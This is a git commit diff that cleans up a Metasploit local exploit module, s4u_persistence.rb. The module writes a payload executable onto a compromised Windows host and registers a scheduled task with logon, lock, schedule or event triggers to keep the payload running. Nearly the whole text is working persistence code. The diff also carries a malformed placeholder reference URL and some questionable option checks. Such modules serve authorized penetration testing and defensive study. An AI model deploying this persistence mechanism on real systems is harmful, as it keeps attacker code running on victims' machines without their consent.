9a4d25e41004a15ef536e96622caf2cf52798ac8
Thomas McCarthy <smilingraccoon@gmail.com>
2013-02-08 22:32:44 -0500

    General clean up / comments

--- s4u_persistence.rb
+++ s4u_persistence.rb
@@ -41,82 +41,73 @@ class Metasploit3 < Msf::Exploit::Local
 			'Targets'       => [ [ 'Windows', {} ] ],
 			'DefaultTarget' => 0,
 			'References'     => [
+				[ 'URL', 'http;//www.pentestgeek.com'], # ADD FULL LINK
 				[ 'URL', 'http://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/']
 			]
 		))
 
 		register_options(
 			[
-				OptInt.new('FREQUENCY', [false, 'Schedule trigger: Frequency in minutes to execute', '']),
-				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until trigger expires', '']),
+				OptInt.new('FREQUENCY', [false, 'Schedule trigger: Frequency in minutes to execute']),
+				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until trigger expires']),
 				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'schedule',['logon', 'lock', 'unlock','schedule', 'event']]),
-				OptString.new('REXENAME',[false, 'Name of exe on remote system', '']),
-				OptString.new('RTASKNAME',[false, 'Name of exe on remote system', '']),
-				OptString.new('PATH',[false, 'PATH to write payload', '']),
+				OptString.new('REXENAME',[false, 'Name of exe on remote system']),
+				OptString.new('RTASKNAME',[false, 'Name of exe on remote system']),
+				OptString.new('PATH',[false, 'PATH to write payload'])
 			], self.class)
 
 		register_advanced_options(
 			[
-				OptString.new('EVENT_LOG', [false, 'Event trigger: The event log to check for event','']),
-				OptInt.new('EVENT_ID', [false, 'Event trigger: Event ID to trigger on.','']),
-				OptString.new('XPATH', [false, 'XPath query','']),
+				OptString.new('EVENT_LOG', [false, 'Event trigger: The event log to check for event']),
+				OptInt.new('EVENT_ID', [false, 'Event trigger: Event ID to trigger on.']),
+				OptString.new('XPATH', [false, 'XPath query'])
 			], self.class)
 	end
 
 	def exploit
-		# If Vista/2008 or later add /R
 		if not (sysinfo['OS'] =~ /Build [6-9]\d\d\d/)
 			print_error("This module only works on Vista/2008 and above")
 			return
 		end
 
 		if datastore['TRIGGER'] == "event"
-			if datastore['EVENT_LOG'].empty? or datastore['EVENT_ID'] == 0
+			if datastore['EVENT_LOG'].nil? or datastore['EVENT_ID'].nil?
 				print_error("Advanced options EVENT_LOG and EVENT_ID required for event")
-				print_error("The properties of any event in the event viewer will contain this information")
+				print_status("The properties of any event in the event viewer will contain this information")
 				return
 			end
 		end
-
-		schname = Rex::Text.rand_text_alpha((rand(8)+6))
 
 		# Generate payload
 		payload = generate_payload_exe
 
 		# Generate remote executable name
 		rexename = generate_rexename
-		return if rexename.nil?
 
 		# Generate path names
 		xml_path,rexe_path = generate_path(rexename)
-		return if not xml_path or not rexe_path
 
 		# Upload REXE to victim fs
 		upload_response = upload_rexe(rexe_path, payload)
 		return if not upload_response
 
 		# Create basic XML outline
-		xml = create_xml(rexe_path, schname)
-		if not xml
+		xml = create_xml(rexe_path)
+
+		# Fix XML based on trigger
+		xml = add_xml_triggers(xml)
+
+		# Write XML to victim fs, if fail clean up
+		if not write_xml(xml, xml_path)
 			delete_file(rexe_path)
 			return
 		end
 
-		# Fix XML based on trigger
-		xml = fix_xml(xml)
-
-		# Write XML to victim fs
-		path = write_xml(xml, xml_path, rexe_path)
-		return if not path
-
 		# Name task with Opt
-		if not datastore['RTASKNAME'].empty?
-			schname = datastore['RTASKNAME']
-		end
+		schname = datastore['RTASKNAME'] || Rex::Text.rand_text_alpha((rand(8)+6))
 
 		# Create task with modified XML
 		task = create_task(xml_path, schname, rexe_path)
-		return if not task
 	end
 
 	##############################################################
@@ -124,8 +115,7 @@ class Metasploit3 < Msf::Exploit::Local
 	# Returns name
 
 	def generate_rexename
-		# Check for valid rexename
-		if datastore['REXENAME'].empty?
+		if datastore['REXENAME'].nil?
 			rexename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
 			return rexename
 		elsif datastore['REXENAME'] =~ /\.exe$/
@@ -143,11 +133,7 @@ class Metasploit3 < Msf::Exploit::Local
 
 	def generate_path(rexename)
 		# generate a path to write payload and xml
-		if not datastore['PATH'].empty?
-			path = datastore['PATH']
-		else
-			path = session.fs.file.expand_path("%TEMP%")
-		end
+		path = datastore['PATH'] || session.fs.file.expand_path("%TEMP%")
 		xml_path = "#{path}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.xml"
 		rexe_path = "#{path}\\#{rexename}"
 		return xml_path,rexe_path			
@@ -158,8 +144,12 @@ class Metasploit3 < Msf::Exploit::Local
 	# Returns boolean for success
 
 	def upload_rexe(path, payload)
-		begin
 			vprint_status("Uploading #{path}")
+			if file? path
+				print_error("File #{path} already exists...exiting")
+				return false
+			end
+		begin
 			fd = client.fs.file.new(path, "wb")
 			fd.write(payload)
 			fd.close
@@ -175,19 +165,19 @@ class Metasploit3 < Msf::Exploit::Local
 	# Creates a scheduled task, exports as XML, deletes task
 	# Returns normal XML for generic task
 
-	def create_xml(path, schname)
+	def create_xml(rexe_path)
 		xml_path = File.join(Msf::Config.install_root, "data", "exploits", "s4u_persistence")
 		xml_file = File.new(xml_path,"r")
 		xml = xml_file.read
 		xml_file.close
 
-		puts path
+		# Get local time, not system time from victim machine
 		begin
 			vt = client.railgun.kernel32.GetLocalTime(32)
 			ut = vt['lpSystemTime'].unpack("v*")
 			t = ::Time.utc(ut[0],ut[1],ut[3],ut[4],ut[5])
 		rescue
-			print_error("Could not read system time from victim...using your local time to determine expire date")
+			print_warning("Could not read system time from victim...using your local time to determine expire date")
 			t = ::Time.now
 		end
 		date = t.strftime("%Y-%m-%d")
@@ -202,7 +192,7 @@ class Metasploit3 < Msf::Exploit::Local
 		xml = xml.sub(/DOMAINHERE/, user)
 		xml = xml.sub(/USERHERE/, "#{domain}\\#{user}")
 
-		xml = xml.sub(/COMMANDHERE/, "#{domain}\\#{user}")
+		xml = xml.sub(/COMMANDHERE/, rexe_path)
 		return xml
 	end
 
@@ -211,7 +201,7 @@ class Metasploit3 < Msf::Exploit::Local
 	# add in expiration tag if used. 
 	# Returns the modified XML
 
-	def fix_xml(xml)
+	def add_xml_triggers(xml)
 		# Insert trigger 
 		case datastore['TRIGGER']
 			when 'logon'
@@ -228,10 +218,11 @@ class Metasploit3 < Msf::Exploit::Local
 
 			when 'event'
 				line = "*[System[(EventID=#{datastore['EVENT_ID']})]]"
-				if not datastore['XPATH'].empty?
+				if not datastore['XPATH'].nil?
+					# Append xpath queries
 					line << " and #{datastore['XPATH']}"
 				end
-				vprint_status("\tPayload will trigger on #{line}")
+				vprint_status("XPath query: #{line}")
 
 				xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)
 
@@ -240,28 +231,27 @@ class Metasploit3 < Msf::Exploit::Local
 				if datastore['FREQUENCY'] != 0
 					minutes = datastore['FREQUENCY']
 				else
-					if datastore['TRIGGER'] == 'schedule'
-						print_status("Defaulting frequency to every hour")
-					end
+					print_status("Defaulting frequency to every hour")
 					minutes = 60
 				end
 				xml = xml.sub(/<Interval>.*?</, "<Interval>PT#{minutes}M<")
 
 				# Generate expire tag, insert into XML
 				end_boundary = create_expire_tag if datastore['EXPIRE_TIME']
+
+				# Inject expire tag
 				insert = xml.index("</StartBoundary>")
 				xml.insert(insert + 16, "\n      #{end_boundary}")
 		end
 		return xml
 	end
 
-
 	##############################################################
 	# Creates end boundary tag which expires the trigger
 	# Returns XML for expire
 
 	def create_expire_tag()
-		# Get local time of windows system
+		# Get local time, not system time from victim machine
 		begin
 			vt = client.railgun.kernel32.GetLocalTime(32)
 			ut = vt['lpSystemTime'].unpack("v*")
@@ -270,6 +260,7 @@ class Metasploit3 < Msf::Exploit::Local
 			print_error("Could not read system time from victim...using your local time to determine expire date")
 			t = ::Time.now
 		end
+
 		# Create time object to add expire time to and create tag
 		t = t + (datastore['EXPIRE_TIME'] * 60)
 		date = t.strftime("%Y-%m-%d")
@@ -286,8 +277,10 @@ class Metasploit3 < Msf::Exploit::Local
 	def create_trigger_tags(trig, xml)
 		domain, user = client.sys.config.getuid.split('\\')
 
+		# Create session state trigger, weird spacing used to maintain
+		# natural Winadows spacing for XML export
 		temp_xml = "<SessionStateChangeTrigger>\n"
-		temp_xml << "      #{create_expire_tag}" if not datastore['EXPIRE_TIME'] == 0
+		temp_xml << "      #{create_expire_tag}" if not datastore['EXPIRE_TIME']
 		temp_xml << "      <Enabled>true</Enabled>\n"
 		temp_xml << "      <StateChange>#{trig}</StateChange>\n"
 		temp_xml << "      <UserId>#{domain}\\#{user}</UserId>\n"
@@ -304,15 +297,14 @@ class Metasploit3 < Msf::Exploit::Local
 	# Returns altered XML
 
 	def create_trigger_event_tags(log, line, xml)
-		domain, user = client.sys.config.getuid.split('\\')
-
-		# Fscked up XML syntax for windows event #{id} in #{log}
+		# Fscked up XML syntax for windows event #{id} in #{log}, weird spacind
+		# used to maintain natural Windows spacing for XML export
 		temp_xml = "<EventTrigger>\n"
-		temp_xml << "      #{create_expire_tag}\n" if not datastore['EXPIRE_TIME'] == 0
+		temp_xml << "      #{create_expire_tag}\n" if not datastore['EXPIRE_TIME']
 		temp_xml << "      <Enabled>true</Enabled>\n"
 		temp_xml << "      <Subscription>&lt;QueryList&gt;&lt;Query Id=\"0\" "
 		temp_xml << "Path=\"#{log}\"&gt;&lt;Select Path=\"#{log}\"&gt;"
-		temp_xml << "      #{line}"
+		temp_xml << line
 		temp_xml << "&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;"
 		temp_xml << "</Subscription>\n"
 		temp_xml << "    </EventTrigger>"
@@ -323,20 +315,23 @@ class Metasploit3 < Msf::Exploit::Local
 
 	##############################################################
 	# Takes the XML and a path and writes file to filesystem
-	# Returns the path of XML
+	# Returns boolean for success
 
-	def write_xml(xml, path, rexe_path)
+	def write_xml(xml, path)
 		begin
+			if file? path
+				print_error("File #{path} already exists...exiting")
+				return false
+			end
 			fd = session.fs.file.new(path, "wb")
 			fd.write(xml)
 			fd.close
 		rescue
 			print_error("Issues writing XML to #{path}")
-			delete_file(rexe_path)
-			return nil
+			return false
 		end
 		print_status("Successfully wrote XML file to #{path}")
-		return path
+		return true
 	end
 
 	##############################################################
@@ -359,15 +354,20 @@ class Metasploit3 < Msf::Exploit::Local
 
 	def create_task(path, schname, rexe_path)
 		# create task using XML file on victim fs
-		create_task_response = cmd_exec("cmd.exe", "/c schtasks /create /xml #{path} /tn #{schname}")
+		create_task_response = cmd_exec("cmd.exe", "/c schtasks /create /xml #{path} /tn \"#{schname}\"")
 		if create_task_response =~ /has successfully been created/
-			print_good("Persistence created successfully")
-			del_task = "schtasks.exe /delete /tn #{schname} /f"
-			print_status("\t To delete task: #{del_task}")
-			print_status("\t To delete payload: del #{rexe_path}")
+			print_good("Persistence task #{schname} created successfully")
+
+			# Create to delete commands for exe and task
+			del_task = "schtasks /delete /tn \"#{schname}\" /f"
+			print_status("#{"To delete task:".ljust(20)} #{del_task}")
+			print_status("#{"To delete payload:".ljust(20)} del #{rexe_path}")
 			del_task << "\ndel #{rexe_path}"
+			
+			# Delete XML from victim
 			delete_file(path)
 
+			# Save info to notes DB
 			report_note(:host => session.session_host,
 			:type => "host.s4u_persistance.cleanup",
 			:data => {
@@ -382,11 +382,18 @@ class Metasploit3 < Msf::Exploit::Local
 				}
 			)
 			return true
+		elsif create_task_response =~ /ERROR: Cannot create a file when that file already exists/
+			print_error("The scheduled task name is already in use")
+			# Clean up
+			delete_file(rexe_path)
+			delete_file(path)
 		else
 			print_error("Issues creating task using XML file schtasks")
+			vprint_error("Error: #{create_task_response}")
 			if datastore['EVENT_LOG'] == 'Security' and datastore['TRIGGER'] == "Event"
 				print_warning("Security log can restricted by UAC, try a different trigger")
 			end
+			# Clean up
 			delete_file(rexe_path)
 			delete_file(path)
 			return false
